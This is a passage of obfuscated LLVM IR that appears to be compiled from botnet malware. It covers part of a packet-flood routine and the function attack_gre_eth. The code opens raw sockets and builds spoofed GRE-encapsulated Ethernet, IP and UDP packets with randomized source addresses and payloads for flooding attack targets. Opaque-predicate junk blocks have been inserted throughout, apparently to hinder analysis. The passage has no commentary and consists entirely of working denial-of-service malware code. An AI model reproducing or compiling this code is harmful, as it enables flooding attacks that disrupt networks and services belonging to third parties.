  %687 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %686, i32 0, i32 9
  store i32 %685, i32* %687, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %298
  store i32 0, i32* %11, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %320
  %688 = load i8**, i8*** %13, align 8
  %689 = load i32, i32* %11, align 4
  %690 = sext i32 %689 to i64
  %691 = getelementptr inbounds i8*, i8** %688, i64 %690
  %692 = load i8*, i8** %691, align 8
  store i8* %692, i8** %29, align 8
  %693 = load i8*, i8** %29, align 8
  %694 = bitcast i8* %693 to %struct.iphdr*
  store %struct.iphdr* %694, %struct.iphdr** %30, align 8
  %695 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %696 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %695, i64 1
  %697 = bitcast %struct.iphdr* %696 to %struct.grehdr*
  store %struct.grehdr* %697, %struct.grehdr** %31, align 8
  %698 = load %struct.grehdr*, %struct.grehdr** %31, align 8
  %699 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %698, i64 1
  %700 = bitcast %struct.grehdr* %699 to %struct.iphdr*
  store %struct.iphdr* %700, %struct.iphdr** %32, align 8
  %701 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %702 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %701, i64 1
  %703 = bitcast %struct.iphdr* %702 to %struct.udphdr*
  store %struct.udphdr* %703, %struct.udphdr** %33, align 8
  %704 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %705 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %704, i64 1
  %706 = bitcast %struct.udphdr* %705 to i8*
  store i8* %706, i8** %34, align 8
  %707 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %708 = load i32, i32* %11, align 4
  %709 = sext i32 %708 to i64
  %710 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %707, i64 %709
  %711 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %710, i32 0, i32 2
  %712 = load i8, i8* %711, align 4
  %713 = zext i8 %712 to i32
  %714 = icmp slt i32 %713, 32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %364
  %715 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %716 = load i32, i32* %11, align 4
  %717 = sext i32 %716 to i64
  %718 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %715, i64 %717
  %719 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %718, i32 0, i32 1
  %720 = load i32, i32* %719, align 4
  %721 = call i32 @ntohl(i32 %720) #7
  %722 = call i32 @rand_next()
  %723 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %724 = load i32, i32* %11, align 4
  %725 = sext i32 %724 to i64
  %726 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %723, i64 %725
  %727 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %726, i32 0, i32 2
  %728 = load i8, i8* %727, align 4
  %729 = zext i8 %728 to i32
  %_ = sub i32 %722, %729
  %gen = mul i32 %_, %729
  %_19 = sub i32 0, %722
  %gen20 = add i32 %_19, %729
  %_21 = sub i32 %722, %729
  %gen22 = mul i32 %_21, %729
  %730 = lshr i32 %722, %729
  %_23 = shl i32 %721, %730
  %_24 = sub i32 %721, %730
  %gen25 = mul i32 %_24, %730
  %731 = add i32 %721, %730
  %732 = call i32 @htonl(i32 %731) #7
  %733 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %734 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %733, i32 0, i32 9
  store i32 %732, i32* %734, align 4
  br label %originalBB18

originalBB29alteredBB:                            ; preds = %originalBB29, %401
  %735 = load i32, i32* %23, align 4
  %736 = icmp eq i32 %735, -1
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %424
  %737 = load i16, i16* %15, align 2
  %738 = zext i16 %737 to i32
  %739 = icmp eq i32 %738, 65535
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %473
  %740 = call i32 @rand_next()
  %_38 = sub i32 0, %740
  %gen39 = add i32 %_38, 65535
  %_40 = shl i32 %740, 65535
  %_41 = shl i32 %740, 65535
  %_42 = shl i32 %740, 65535
  %_43 = sub i32 0, %740
  %gen44 = add i32 %_43, 65535
  %_45 = shl i32 %740, 65535
  %741 = and i32 %740, 65535
  %742 = trunc i32 %741 to i16
  %743 = load %struct.udphdr*, %struct.udphdr** %33, align 8
  %744 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %743, i32 0, i32 1
  store i16 %742, i16* %744, align 2
  br label %originalBB37

originalBB49alteredBB:                            ; preds = %originalBB49, %495
  %745 = load i8, i8* %22, align 1
  %746 = icmp ne i8 %745, 0
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %518
  %747 = load %struct.iphdr*, %struct.iphdr** %30, align 8
  %748 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %747, i32 0, i32 9
  %749 = load i32, i32* %748, align 4
  %750 = load %struct.iphdr*, %struct.iphdr** %32, align 8
  %751 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %750, i32 0, i32 9
  store i32 %749, i32* %751, align 4
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %543
  %752 = load i8*, i8** %34, align 8
  %753 = load i32, i32* %20, align 4
  call void @rand_alphastr(i8* %752, i32 %753)
  %754 = load i8*, i8** %34, align 8
  %755 = load i32, i32* %20, align 4
  %756 = sext i32 %755 to i64
  %757 = getelementptr inbounds i8, i8* %754, i64 %756
  store i8 0, i8* %757, align 1
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %641
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %659
  br label %originalBB65
}

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_eth(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.ethhdr*, align 8
  %28 = alloca %struct.iphdr*, align 8
  %29 = alloca %struct.udphdr*, align 8
  %30 = alloca i32, align 4
  %31 = alloca i32, align 4
  %32 = alloca i32, align 4
  %33 = alloca i8*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.grehdr*, align 8
  %36 = alloca %struct.ethhdr*, align 8
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.udphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i32, align 4
  %41 = alloca i32, align 4
  %42 = alloca i32, align 4
  %43 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %44 = load i8, i8* %7, align 1
  %45 = zext i8 %44 to i64
  %46 = call noalias i8* @calloc(i64 %45, i64 8) #6
  %47 = bitcast i8* %46 to i8**
  store i8** %47, i8*** %13, align 8
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 2, i32 0)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %14, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 3, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %15, align 2
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 4, i32 64)
  %59 = trunc i32 %58 to i8
  store i8 %59, i8* %16, align 1
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 5, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %17, align 1
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 6, i32 65535)
  %67 = trunc i32 %66 to i16
  store i16 %67, i16* %18, align 2
  %68 = load i8, i8* %9, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %19, align 2
  %72 = load i8, i8* %9, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 0, i32 512)
  store i32 %74, i32* %20, align 4
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 1, i32 1)
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %21, align 1
  %79 = load i8, i8* %9, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 18, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %22, align 1
  %83 = load i8, i8* %9, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %85 = load i32, i32* @LOCAL_ADDR, align 4
  %86 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 24, i32 %85)
  store i32 %86, i32* %23, align 4
  %87 = call i64 @time(i64* null) #6
  %88 = load i32, i32* %6, align 4
  %89 = sext i32 %88 to i64
  %90 = add nsw i64 %87, %89
  %91 = trunc i64 %90 to i32
  store i32 %91, i32* %24, align 4
  %92 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %92, i32* %12, align 4
  %93 = icmp eq i32 %92, -1
  br i1 %93, label %94, label %95

; <label>:94:                                     ; preds = %5
  br label %650

; <label>:95:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %96 = load i32, i32* %12, align 4
  %97 = bitcast i32* %11 to i8*
  %98 = call i32 @setsockopt(i32 %96, i32 0, i32 3, i8* %97, i32 4) #6
  %99 = icmp eq i32 %98, -1
  br i1 %99, label %100, label %103

; <label>:100:                                    ; preds = %95
  %101 = load i32, i32* %12, align 4
  %102 = call i32 @close(i32 %101)
  br label %650

; <label>:103:                                    ; preds = %95
  store i32 0, i32* %11, align 4
  br label %104

; <label>:104:                                    ; preds = %originalBBpart213, %103
  %105 = load i32, i32* @x.21
  %106 = load i32, i32* @y.22
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %104
  %113 = load i32, i32* %11, align 4
  %114 = load i8, i8* %7, align 1
  %115 = zext i8 %114 to i32
  %116 = icmp slt i32 %113, %115
  %117 = load i32, i32* @x.21
  %118 = load i32, i32* @y.22
  %119 = sub i32 %117, 1
  %120 = mul i32 %117, %119
  %121 = urem i32 %120, 2
  %122 = icmp eq i32 %121, 0
  %123 = icmp slt i32 %118, 10
  %124 = or i1 %122, %123
  br i1 %124, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %116, label %125, label %311

; <label>:125:                                    ; preds = %originalBBpart2
  %126 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %127 = load i8**, i8*** %13, align 8
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds i8*, i8** %127, i64 %129
  store i8* %126, i8** %130, align 8
  %131 = load i8**, i8*** %13, align 8
  %132 = load i32, i32* %11, align 4
  %133 = sext i32 %132 to i64
  %134 = getelementptr inbounds i8*, i8** %131, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  store %struct.iphdr* %136, %struct.iphdr** %25, align 8
  %137 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %138 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %137, i64 1
  %139 = bitcast %struct.iphdr* %138 to %struct.grehdr*
  store %struct.grehdr* %139, %struct.grehdr** %26, align 8
  %140 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %141 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %140, i64 1
  %142 = bitcast %struct.grehdr* %141 to %struct.ethhdr*
  store %struct.ethhdr* %142, %struct.ethhdr** %27, align 8
  %143 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %144 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %143, i64 1
  %145 = bitcast %struct.ethhdr* %144 to %struct.iphdr*
  store %struct.iphdr* %145, %struct.iphdr** %28, align 8
  %146 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %147 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %146, i64 1
  %148 = bitcast %struct.iphdr* %147 to %struct.udphdr*
  store %struct.udphdr* %148, %struct.udphdr** %29, align 8
  %149 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %150 = bitcast %struct.iphdr* %149 to i8*
  %151 = load i8, i8* %150, align 4
  %152 = and i8 %151, 15
  %153 = or i8 %152, 64
  store i8 %153, i8* %150, align 4
  %154 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %155 = bitcast %struct.iphdr* %154 to i8*
  %156 = load i8, i8* %155, align 4
  %157 = and i8 %156, -16
  %158 = or i8 %157, 5
  store i8 %158, i8* %155, align 4
  %159 = load i8, i8* %14, align 1
  %160 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %161 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %160, i32 0, i32 1
  store i8 %159, i8* %161, align 1
  %162 = load i32, i32* %20, align 4
  %163 = sext i32 %162 to i64
  %164 = add i64 66, %163
  %165 = trunc i64 %164 to i16
  %166 = call zeroext i16 @htons(i16 zeroext %165) #7
  %167 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i32 0, i32 2
  store i16 %166, i16* %168, align 2
  %169 = load i16, i16* %15, align 2
  %170 = call zeroext i16 @htons(i16 zeroext %169) #7
  %171 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 3
  store i16 %170, i16* %172, align 4
  %173 = load i8, i8* %16, align 1
  %174 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %175 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %174, i32 0, i32 5
  store i8 %173, i8* %175, align 4
  %176 = load i8, i8* %17, align 1
  %177 = icmp ne i8 %176, 0
  br i1 %177, label %178, label %182

; <label>:178:                                    ; preds = %125
  %179 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %180 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %181 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %180, i32 0, i32 4
  store i16 %179, i16* %181, align 2
  br label %182

; <label>:182:                                    ; preds = %178, %125
  %183 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %184 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %183, i32 0, i32 6
  store i8 47, i8* %184, align 1
  %185 = load i32, i32* %23, align 4
  %186 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %187 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %186, i32 0, i32 8
  store i32 %185, i32* %187, align 4
  %188 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %189 = load i32, i32* %11, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %188, i64 %190
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %191, i32 0, i32 1
  %193 = load i32, i32* %192, align 4
  %194 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %195 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %194, i32 0, i32 9
  store i32 %193, i32* %195, align 4
  %196 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %197 = load %struct.grehdr*, %struct.grehdr** %26, align 8
  %198 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %197, i32 0, i32 1
  store i16 %196, i16* %198, align 2
  %199 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %200 = load %struct.ethhdr*, %struct.ethhdr** %27, align 8
  %201 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %200, i32 0, i32 2
  store i16 %199, i16* %201, align 1
  %202 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %203 = bitcast %struct.iphdr* %202 to i8*
  %204 = load i8, i8* %203, align 4
  %205 = and i8 %204, 15
  %206 = or i8 %205, 64
  store i8 %206, i8* %203, align 4
  %207 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %208 = bitcast %struct.iphdr* %207 to i8*
  %209 = load i8, i8* %208, align 4
  %210 = and i8 %209, -16
  %211 = or i8 %210, 5
  store i8 %211, i8* %208, align 4
  %212 = load i8, i8* %14, align 1
  %213 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %214 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %213, i32 0, i32 1
  store i8 %212, i8* %214, align 1
  %215 = load i32, i32* %20, align 4
  %216 = sext i32 %215 to i64
  %217 = add i64 28, %216
  %218 = trunc i64 %217 to i16
  %219 = call zeroext i16 @htons(i16 zeroext %218) #7
  %220 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %221 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %220, i32 0, i32 2
  store i16 %219, i16* %221, align 2
  %222 = load i16, i16* %15, align 2
  %223 = zext i16 %222 to i32
  %224 = xor i32 %223, -1
  %225 = trunc i32 %224 to i16
  %226 = call zeroext i16 @htons(i16 zeroext %225) #7
  %227 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %228 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %227, i32 0, i32 3
  store i16 %226, i16* %228, align 4
  %229 = load i8, i8* %16, align 1
  %230 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %231 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %230, i32 0, i32 5
  store i8 %229, i8* %231, align 4
  %232 = load i8, i8* %17, align 1
  %233 = icmp ne i8 %232, 0
  br i1 %233, label %234, label %254

; <label>:234:                                    ; preds = %182
  %235 = load i32, i32* @x.21
  %236 = load i32, i32* @y.22
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %234
  %243 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %244 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %245 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %244, i32 0, i32 4
  store i16 %243, i16* %245, align 2
  %246 = load i32, i32* @x.21
  %247 = load i32, i32* @y.22
  %248 = sub i32 %246, 1
  %249 = mul i32 %246, %248
  %250 = urem i32 %249, 2
  %251 = icmp eq i32 %250, 0
  %252 = icmp slt i32 %247, 10
  %253 = or i1 %251, %252
  br i1 %253, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %254

; <label>:254:                                    ; preds = %originalBBpart24, %182
  %255 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %256 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %255, i32 0, i32 6
  store i8 17, i8* %256, align 1
  %257 = call i32 @rand_next()
  %258 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %259 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %258, i32 0, i32 8
  store i32 %257, i32* %259, align 4
  %260 = load i8, i8* %22, align 1
  %261 = icmp ne i8 %260, 0
  br i1 %261, label %262, label %268

; <label>:262:                                    ; preds = %254
  %263 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 9
  %265 = load i32, i32* %264, align 4
  %266 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 9
  store i32 %265, i32* %267, align 4
  br label %276

; <label>:268:                                    ; preds = %254
  %269 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 8
  %271 = load i32, i32* %270, align 4
  %272 = sub i32 %271, 1024
  %273 = xor i32 %272, -1
  %274 = load %struct.iphdr*, %struct.iphdr** %28, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  store i32 %273, i32* %275, align 4
  br label %276

; <label>:276:                                    ; preds = %268, %262
  %277 = load i16, i16* %18, align 2
  %278 = call zeroext i16 @htons(i16 zeroext %277) #7
  %279 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %280 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %279, i32 0, i32 0
  store i16 %278, i16* %280, align 2
  %281 = load i16, i16* %19, align 2
  %282 = call zeroext i16 @htons(i16 zeroext %281) #7
  %283 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %284 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %283, i32 0, i32 1
  store i16 %282, i16* %284, align 2
  %285 = load i32, i32* %20, align 4
  %286 = sext i32 %285 to i64
  %287 = add i64 8, %286
  %288 = trunc i64 %287 to i16
  %289 = call zeroext i16 @htons(i16 zeroext %288) #7
  %290 = load %struct.udphdr*, %struct.udphdr** %29, align 8
  %291 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %290, i32 0, i32 2
  store i16 %289, i16* %291, align 2
  br label %292

; <label>:292:                                    ; preds = %276
  %293 = load i32, i32* @x.21
  %294 = load i32, i32* @y.22
  %295 = sub i32 %293, 1
  %296 = mul i32 %293, %295
  %297 = urem i32 %296, 2
  %298 = icmp eq i32 %297, 0
  %299 = icmp slt i32 %294, 10
  %300 = or i1 %298, %299
  br i1 %300, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %292
  %301 = load i32, i32* %11, align 4
  %302 = add nsw i32 %301, 1
  store i32 %302, i32* %11, align 4
  %303 = load i32, i32* @x.21
  %304 = load i32, i32* @y.22
  %305 = sub i32 %303, 1
  %306 = mul i32 %303, %305
  %307 = urem i32 %306, 2
  %308 = icmp eq i32 %307, 0
  %309 = icmp slt i32 %304, 10
  %310 = or i1 %308, %309
  br i1 %310, label %originalBBpart213, label %originalBB6alteredBB

originalBBpart213:                                ; preds = %originalBB6
  br label %104

; <label>:311:                                    ; preds = %originalBBpart2
  br label %312

; <label>:312:                                    ; preds = %originalBBpart241, %311
  store i32 0, i32* %11, align 4
  br label %313

; <label>:313:                                    ; preds = %608, %312
  %314 = load i32, i32* %11, align 4
  %315 = load i8, i8* %7, align 1
  %316 = zext i8 %315 to i32
  %317 = icmp slt i32 %314, %316
  br i1 %317, label %318, label %611

; <label>:318:                                    ; preds = %313
  %319 = load i8**, i8*** %13, align 8
  %320 = load i32, i32* %11, align 4
  %321 = sext i32 %320 to i64
  %322 = getelementptr inbounds i8*, i8** %319, i64 %321
  %323 = load i8*, i8** %322, align 8
  store i8* %323, i8** %33, align 8
  %324 = load i8*, i8** %33, align 8
  %325 = bitcast i8* %324 to %struct.iphdr*
  store %struct.iphdr* %325, %struct.iphdr** %34, align 8
  %326 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %327 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %326, i64 1
  %328 = bitcast %struct.iphdr* %327 to %struct.grehdr*
  store %struct.grehdr* %328, %struct.grehdr** %35, align 8
  %329 = load %struct.grehdr*, %struct.grehdr** %35, align 8
  %330 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %329, i64 1
  %331 = bitcast %struct.grehdr* %330 to %struct.ethhdr*
  store %struct.ethhdr* %331, %struct.ethhdr** %36, align 8
  %332 = load %struct.ethhdr*, %struct.ethhdr** %36, align 8
  %333 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %332, i64 1
  %334 = bitcast %struct.ethhdr* %333 to %struct.iphdr*
  store %struct.iphdr* %334, %struct.iphdr** %37, align 8
  %335 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %336 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %335, i64 1
  %337 = bitcast %struct.iphdr* %336 to %struct.udphdr*
  store %struct.udphdr* %337, %struct.udphdr** %38, align 8
  %338 = load %struct.udphdr*, %struct.udphdr** %38, align 8
  %339 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %338, i64 1
  %340 = bitcast %struct.udphdr* %339 to i8*
  store i8* %340, i8** %39, align 8
  %341 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %342 = load i32, i32* %11, align 4
  %343 = sext i32 %342 to i64
  %344 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %341, i64 %343
  %345 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %344, i32 0, i32 2
  %346 = load i8, i8* %345, align 4
  %347 = zext i8 %346 to i32
  %348 = icmp slt i32 %347, 32
  br i1 %348, label %349, label %370

; <label>:349:                                    ; preds = %318
  %350 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %351 = load i32, i32* %11, align 4
  %352 = sext i32 %351 to i64
  %353 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %350, i64 %352
  %354 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %353, i32 0, i32 1
  %355 = load i32, i32* %354, align 4
  %356 = call i32 @ntohl(i32 %355) #7
  %357 = call i32 @rand_next()
  %358 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %359 = load i32, i32* %11, align 4
  %360 = sext i32 %359 to i64
  %361 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %358, i64 %360
  %362 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %361, i32 0, i32 2
  %363 = load i8, i8* %362, align 4
  %364 = zext i8 %363 to i32
  %365 = lshr i32 %357, %364
  %366 = add i32 %356, %365
  %367 = call i32 @htonl(i32 %366) #7
  %368 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %369 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %368, i32 0, i32 9
  store i32 %367, i32* %369, align 4
  br label %370

; <label>:370:                                    ; preds = %349, %318
  %371 = load i32, i32* %23, align 4
  %372 = icmp eq i32 %371, -1
  br i1 %372, label %373, label %393

; <label>:373:                                    ; preds = %370
  %374 = load i32, i32* @x.21
  %375 = load i32, i32* @y.22
  %376 = sub i32 %374, 1
  %377 = mul i32 %374, %376
  %378 = urem i32 %377, 2
  %379 = icmp eq i32 %378, 0
  %380 = icmp slt i32 %375, 10
  %381 = or i1 %379, %380
  br i1 %381, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %373
  %382 = call i32 @rand_next()
  %383 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %384 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %383, i32 0, i32 8
  store i32 %382, i32* %384, align 4
  %385 = load i32, i32* @x.21
  %386 = load i32, i32* @y.22
  %387 = sub i32 %385, 1
  %388 = mul i32 %385, %387
  %389 = urem i32 %388, 2
  %390 = icmp eq i32 %389, 0
  %391 = icmp slt i32 %386, 10
  %392 = or i1 %390, %391
  br i1 %392, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %393

; <label>:393:                                    ; preds = %originalBBpart217, %370
  %394 = load i32, i32* @x.21
  %395 = load i32, i32* @y.22
  %396 = sub i32 %394, 1
  %397 = mul i32 %394, %396
  %398 = urem i32 %397, 2
  %399 = icmp eq i32 %398, 0
  %400 = icmp slt i32 %395, 10
  %401 = or i1 %399, %400
  br i1 %401, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %393
  %402 = load i16, i16* %15, align 2
  %403 = zext i16 %402 to i32
  %404 = icmp eq i32 %403, 65535
  %405 = load i32, i32* @x.21
  %406 = load i32, i32* @y.22
  %407 = sub i32 %405, 1
  %408 = mul i32 %405, %407
